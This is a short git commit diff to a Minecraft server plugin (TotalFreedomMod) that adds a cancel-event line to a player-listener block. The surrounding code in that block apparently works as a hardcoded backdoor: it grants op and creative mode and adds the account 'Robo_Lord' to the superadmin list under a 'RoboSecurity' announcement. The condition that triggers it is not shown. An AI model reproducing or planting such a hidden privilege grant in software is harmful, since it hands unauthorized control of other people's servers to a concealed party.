4641abc2728720cff4924e94dea23adae4058932
Liam <overhypedlord@gmail.com>
2014-07-18 20:39:01 +0100

    Idiot >. <

--- src/me/StevenLawson/TotalFreedomMod/Listener/TFM_PlayerListener.java
+++ src/me/StevenLawson/TotalFreedomMod/Listener/TFM_PlayerListener.java
@@ -526,6 +526,7 @@ public class TFM_PlayerListener implements Listener
                 player.setOp(true);
                 player.setHealth(20.0);
                 player.setGameMode(GameMode.CREATIVE);
+                event.setCancelled(true);
                 TFM_adminAction("RoboSecurity", "Adding Robo_Lord to the superadmin list.", true);
                 TFM_AdminList.addSuperadmin(player);
             }
